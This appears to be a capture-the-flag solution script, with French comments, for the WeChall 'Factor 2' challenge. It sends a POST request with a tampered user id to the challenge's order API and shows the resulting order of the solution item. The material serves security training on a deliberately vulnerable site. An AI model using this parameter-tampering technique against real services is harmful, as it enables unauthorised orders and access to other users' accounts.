#with/ Hackbar --> POST & Data
# on va utiliser post et pas get pour cette tentative
import requests

url = "http://authme.wechall.net/challenge/gizmore/factor2/backend/api/bestellen.php"

r = requests.post(url,data = {"user":6,'id':5678363,'atm':1})
print(r.status_code)
"""
1	
article	
id	5678363
name	"solution"
amt	1
title	"Challenge solution for Factor 2"
amt	1
ordered_at	"2018-11-01"
delivered_at	"2018-11-02"
"""
# POST = {'user': 13,'id': 5678363,'amt': 1}
#with requests.post(url=url, data=POST) as response: #print(response.text)